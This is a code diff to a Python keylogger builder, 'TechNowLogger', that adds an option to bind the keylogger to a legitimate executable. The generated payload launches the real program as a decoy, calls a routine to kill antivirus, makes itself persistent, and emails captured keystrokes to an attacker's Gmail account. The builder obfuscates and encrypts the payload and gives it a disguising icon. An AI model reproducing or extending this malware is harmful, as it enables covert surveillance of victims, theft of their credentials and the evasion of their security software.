@@ -12,14 +12,15 @@ BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m'
 WINDOWS_PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe")
 
 def get_arguments():
-    parser = argparse.ArgumentParser(description=f'{RED}TechNowLogger v1.3')
+    parser = argparse.ArgumentParser(description=f'{RED}TechNowLogger v1.4')
     parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
     parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds. default=120", default=120)
     parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", default=10)    
     parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
     parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
+    parser.add_argument("-b", "--bind", dest="bind", help="AutoBinder : Specify Path of Legitimate file.")
     
-
+    
     required_arguments = parser.add_argument_group(f'{RED}Required Arguments{GREEN}')
     required_arguments.add_argument("--icon", dest="icon", help="Specify Icon Path, Icon of Evil File [Note : Must Be .ico].")
     required_arguments.add_argument("-e", "--email", dest="email", help="Email address to send reports to.")
@@ -60,6 +61,16 @@ def create_keylogger(file_name, interval, email, password, time_persistent):
         file.write("technowlogger.kill_av()\n")        
         file.write(f"technowlogger.become_persistent({time_persistent})\n")
         file.write("technowlogger.start()\n")
+
+def create_keylogger_binded(file_name, interval, email, password, time_persistent, legitimate_file):
+    with open(file_name, "w+") as file:
+        file.write("import keylogger, sys, subprocess\n\n")
+        file.write(f"file_name = sys._MEIPASS.replace('\\\\', '/') + \"/{legitimate_file}\" \n")       
+        file.write(f"subprocess.Popen(file_name, shell=True)\n")
+        file.write(f"technowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\')\n")
+        file.write("technowlogger.kill_av()\n")        
+        file.write(f"technowlogger.become_persistent({time_persistent})\n")
+        file.write("technowlogger.start()\n")               
         
 def obfuscating_payload(file_name):
     gen = DocumentGenerator()
@@ -70,17 +81,23 @@ def obfuscating_payload(file_name):
 def compile_for_windows(file_name, icon_path):
     subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
 
+def compile_for_windows_binded(file_name, icon_path):
+    subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path} --add-data \"{arguments.bind};.\"", shell=True)
+
 def compile_for_linux(file_name, icon_path):
     subprocess.call(f"pyinstaller --onefile --noconsole --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
 
 def del_junk_file(file_name):
-    build = os.getcwd() + "\\build"
-    file_name = os.getcwd() + f"\\{file_name}"
-    pycache = os.getcwd() + "\\__pycache__"
-    os.remove(file_name)
-    os.remove(file_name + ".spec")    
-    shutil.rmtree(build)
-    shutil.rmtree(pycache)
+    try:
+        build = os.getcwd() + "\\build"
+        file_name = os.getcwd() + f"\\{file_name}"
+        pycache = os.getcwd() + "\\__pycache__"
+        os.remove(file_name)
+        os.remove(file_name + ".spec")    
+        shutil.rmtree(build)
+        shutil.rmtree(pycache)
+    except Exception:
+        pass
 
 def exit_greet():
     try:
@@ -96,7 +113,7 @@ if __name__ == '__main__':
         print(banners.get_banner())
         print(f"\t\t{YELLOW}Author: {GREEN}Pushpender | {YELLOW}Website: {GREEN}technowlogy.tk\n")
 
-        arguments = get_arguments()
+        arguments = get_arguments()       
 
         print(f'\n{GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]{GREEN}')
         print(f'\n   {YELLOW}Email:{RED} ' + arguments.email)
@@ -105,6 +122,10 @@ if __name__ == '__main__':
         print(f'   {YELLOW}Becomes Persistence After:{RED} ' + str(arguments.time_persistent) + ' seconds')
         print(f'   {YELLOW}Output Evil File Name:{RED} ' + arguments.out) 
         print(f'   {YELLOW}Icon Path:{RED} ' + arguments.icon)
+        
+        if arguments.bind != None:
+            print(f'   {YELLOW}Binding To [{RED}Legitimate File Path{YELLOW}]:{RED} ' + str(arguments.bind))
+            
         print(f'\n{GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]')
         
         ask = input(f'\n{WHITE}[?] These info above are correct? (y/n) : ')
@@ -114,16 +135,21 @@ if __name__ == '__main__':
         else:
             arguments.email = input('\n[?] Type your gmail to receive logs: ')
             arguments.password = input('[?] Type your gmail password: ')
-            arguments.interval = int(input('[?] Time interval to send logs; [In Seconds]: '))
-            arguments.time_persistent = int(input('[?] Time after to become persistence; [In Seconds]: '))   
+            arguments.interval = int(input(f'[?] Time interval to send logs; [{RED}In Seconds{WHITE}]: '))
+            arguments.time_persistent = int(input(f'[?] Time after to become persistence; [{RED}In Seconds{WHITE}]: '))   
             arguments.out = input('[?] Output Evil File Name: ')  
-            arguments.icon = input('[?] Icon Path (If Present In This Directory, then just type Name): ')               
+            arguments.icon = input(f'[?] Icon Path [{RED}If Present In This Directory, then just type Name{WHITE}]: ')  
+            if arguments.bind != None:
+                arguments.bind = input(f'[?] Path of Legitimate File [{RED}.exe is Recommended{WHITE}]: ')
 
         check_dependencies()
 
         print(f"\n{YELLOW}[*] Generating Please wait for a while...{MAGENTA}\n")
 
-        create_keylogger(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent))
+        if arguments.bind == '' or arguments.bind == None:
+            create_keylogger(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent))
+        else:
+            create_keylogger_binded(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent), arguments.bind.split("\\")[-1])            
         obfuscating_payload(arguments.out)
         
         encrypting_code = encrypt_code.Encrypt()
@@ -132,10 +158,16 @@ if __name__ == '__main__':
         print(f"{MAGENTA}")
 
         if arguments.windows:
-            compile_for_windows(arguments.out, arguments.icon)
+            if arguments.bind == None or arguments.bind == "":
+                compile_for_windows(arguments.out, arguments.icon)
+            else:
+                compile_for_windows_binded(arguments.out, arguments.icon)
 
-        if arguments.linux:
-            compile_for_linux(arguments.out, arguments.icon)
+        elif arguments.linux:
+            compile_for_linux(arguments.out, arguments.icon)  
+
+        else:
+            print(f"{RED}[!] Please Specify {YELLOW}-w{RED} for {GREEN}WINDOWS{RED} or {YELLOW}-l{RED} for {GREEN}LINUX{RED} payload generation")
 
         print(f"\n{YELLOW}[*] Deleting Junk Files...")
         del_junk_file(arguments.out)
@@ -144,7 +176,8 @@ if __name__ == '__main__':
         if os.path.exists(f'dist/{arguments.out}.exe'):
             print(f"\n{GREEN}[+] Generated Successfully!\n")           
             print(f"\n\n{RED}[***] Don't forget to allow less secure applications in your Gmail account.")
-            print(f"{GREEN}Use the following link to do so https://myaccount.google.com/lesssecureapps")        
+            print(f"{GREEN}Use the following link to do so https://myaccount.google.com/lesssecureapps")
+            print(f"\n{RED} :O-) TIP{YELLOW} : USE ICONS from {RED}icon{YELLOW} folder like this >>  {RED}--icon icon/exe.ico")
 
         else:
             print(f"\n{RED}[!] Failed To Generate Your Payload :(, Please Try Again!\n")
